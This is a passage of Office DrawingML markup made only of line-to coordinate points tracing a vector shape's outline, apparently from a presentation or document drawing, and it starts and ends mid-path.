                <a:lnTo>
                  <a:pt x="1677123" y="1967699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1679308" y="1904199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1677022" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1668297" y="1777199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1660448" y="1713699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1658289" y="1662899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1660220" y="1612099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1664639" y="1561299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1669961" y="1523199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1674583" y="1485099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1676908" y="1434299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1675345" y="1396199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1668297" y="1345399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1660321" y="1294599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1658391" y="1243799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1660639" y="1180299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1665147" y="1116799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1670050" y="1065999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1673466" y="1015199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1673504" y="977099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1668297" y="938999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1706714" y="888199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1745361" y="850099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1784311" y="824699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1810524" y="799299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1823631" y="786599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1863382" y="761199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1903641" y="723099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1944471" y="697699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1985949" y="684999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2028126" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2071090" y="646899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2114893" y="621499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2205317" y="596099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2252078" y="596099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2299957" y="583399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2558567" y="583399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2574391" y="621499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2584475" y="646899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2589949" y="684999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2591955" y="723099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2591879" y="735799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2591803" y="748499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2591727" y="761199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2591651" y="773899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2590152" y="824699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2588615" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2588514" y="888199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2588399" y="900899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2588298" y="913599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2588183" y="926299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2590000" y="989799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2595194" y="1053299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2604922" y="1116799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2614498" y="1180299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2621013" y="1243799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2625090" y="1294599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2627363" y="1345399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2628481" y="1396199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2629065" y="1446999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2629751" y="1497799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2631186" y="1535899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2634005" y="1586699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2638844" y="1624799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2646337" y="1675599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2657119" y="1713699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2657119" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2638831" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2586342" y="443699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2386838" y="443699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2339238" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2292413" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2155964" y="494499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2111591" y="519899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2024138" y="545299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1895182" y="621499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1852523" y="634199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1767293" y="684999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1724609" y="723099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1595399" y="799299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1530477" y="758164"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1530477" y="1053299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1530096" y="1116799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1527962" y="1154899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1524965" y="1205699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522006" y="1243799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1519986" y="1281899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1519923" y="1294599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1519809" y="1319999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522374" y="1370799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1525905" y="1408899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1527327" y="1459699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1527213" y="1497799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1526082" y="1548599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1524482" y="1599399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522971" y="1650199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522082" y="1700999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522158" y="1713699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522222" y="1726399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522336" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1521320" y="1916899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1520177" y="1967699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1519313" y="2018499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1519212" y="2043899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1519123" y="2069299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1519999" y="2120100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522374" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1500530" y="2168842"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1500530" y="2361400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1324800" y="2247100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1266634" y="2221700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1208862" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1180223" y="2170900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1038974" y="2107400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="983869" y="2081999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="929703" y="2069299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="876592" y="2043899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="773976" y="2018499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="676910" y="1993099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="630732" y="1980399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="586270" y="1980399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="543648" y="1967699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="502958" y="1954999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="427850" y="1954999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="393661" y="1942299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="281838" y="1942299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="281000" y="1904199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="284162" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="290398" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="298843" y="1789899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="308584" y="1739099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="318757" y="1688299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="328460" y="1650199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="336791" y="1586699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="342874" y="1535899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="345821" y="1472399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="344728" y="1408899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="338721" y="1345399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="333349" y="1281899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="332803" y="1231099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="336207" y="1192999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="342658" y="1154899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="351269" y="1116799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="361162" y="1078699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="371436" y="1053299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="381203" y="1015199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="389572" y="977099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="395655" y="938999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="398564" y="900899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="397408" y="850099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="391312" y="799299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="467893" y="799299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="473494" y="850099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="473557" y="900899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="469226" y="951699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="461645" y="989799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="451967" y="1027899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="441312" y="1065999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="430847" y="1116799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="421716" y="1154899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="415061" y="1192999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="412026" y="1243799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="413753" y="1281899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="429628" y="1383499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="431241" y="1434299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="427621" y="1485099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="420166" y="1523199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="410260" y="1561299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="399275" y="1612099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="388607" y="1650199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="379628" y="1688299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="373722" y="1739099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="372287" y="1789899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="376694" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="397789" y="1853399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="446049" y="1853399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="444271" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="447421" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="455256" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="483997" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="504418" y="1815299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="620674" y="1815299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="657161" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="696125" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="737336" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="780516" y="1853399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="825461" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="919581" y="1891499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="968273" y="1916899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1117981" y="1993099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1267942" y="2107400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1316850" y="2145500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1364805" y="2196300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1411566" y="2247100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1456893" y="2297900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1500530" y="2361400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1500530" y="2168842"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1465986" y="2145500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1410093" y="2094699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1300124" y="2018499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1246225" y="1993099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1193190" y="1954999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1141082" y="1929599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1090002" y="1891499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1040041" y="1866099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="991298" y="1840699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="943851" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="920826" y="1815299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="897788" y="1802599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="853211" y="1789899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="810209" y="1764499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="768870" y="1751799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="729272" y="1751799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="691515" y="1739099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="655701" y="1726399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="533552" y="1726399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="523214" y="1675599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="518604" y="1624799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="518668" y="1612099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="518744" y="1599399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="518807" y="1586699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="522859" y="1535899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="529831" y="1485099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="538810" y="1434299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="548843" y="1383499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="559003" y="1332699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="568363" y="1281899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="575983" y="1231099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="580923" y="1180299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="585089" y="1142199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="591248" y="1091399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="598792" y="1053299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="607136" y="1015199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="615708" y="964399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="623887" y="926299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="631113" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="636778" y="824699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="640295" y="773899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="641083" y="723099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="638543" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="632104" y="596099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="693305" y="583399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="859269" y="583399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="909447" y="596099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="957427" y="608799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1003427" y="621499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1047661" y="634199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1090371" y="646899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1131760" y="672299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1172070" y="697699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1211503" y="710399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1326807" y="786599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1364996" y="824699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1442300" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1481886" y="913599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1522374" y="938999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1528203" y="1002499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1530477" y="1053299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1530477" y="758164"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1433207" y="697699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1349260" y="646899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1263370" y="596099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1219669" y="583399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1130744" y="532599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1085507" y="519899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1039736" y="494499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="851293" y="443699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="802805" y="443699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="753757" y="430999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="704151" y="430999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="653961" y="443699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="603186" y="443699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="551840" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="513867" y="456399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="497103" y="469099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="497001" y="494499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="496912" y="519899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="488048" y="570699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="479132" y="608799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="479044" y="621499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="478967" y="634199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="478891" y="646899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="478815" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="439280" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="400596" y="646899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="360883" y="646899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="318287" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="256311" y="659599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="259181" y="710399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="251206" y="748499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="241211" y="811999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="238023" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="156921" y="875499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="135496" y="888199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="119735" y="913599"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="110388" y="938999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="107759" y="989799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="102463" y="1053299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="95199" y="1104099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86677" y="1154899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="77597" y="1205699"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68656" y="1256499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="60591" y="1307299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="54076" y="1358099"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="49834" y="1396199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48577" y="1434299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="50990" y="1472399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57810" y="1510499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="64719" y="1535899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="67424" y="1573999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="66522" y="1624799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="62661" y="1662899"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="56476" y="1726399"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48602" y="1777199"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="39636" y="1827999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30251" y="1891499"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21043" y="1942299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12674" y="2005799"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5753" y="2069299"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="914" y="2120100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="2145500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14605" y="2170900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37858" y="2196300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="110083" y="2196300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="146951" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="222504" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="261226" y="2170900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="551548" y="2170900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="595998" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="641235" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="734187" y="2209000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="781926" y="2209000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="830529" y="2234400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="930402" y="2259800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="981722" y="2285200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1087170" y="2336000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1196530" y="2386800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1252715" y="2424900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1309928" y="2463000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1368183" y="2501100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1427505" y="2539200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1446733" y="2551900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1465008" y="2551900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1484591" y="2564600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1711032" y="2564600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1731556" y="2551900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1750568" y="2551900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1766849" y="2539200"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1826539" y="2513800"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1885950" y="2475700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2119338" y="2374100"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2176310" y="2348700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2288171" y="2323300"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2342934" y="2297900"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2449817" y="2272500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2501811" y="2272500"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2651226" y="2234400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2744749" y="2234400"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2789504" y="2221700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2874657" y="2221700"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2914942" y="2209000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3148444" y="2209000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3172015" y="2183600"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3188995" y="2158200"/>
                </a:lnTo>
                <a:lnTo>
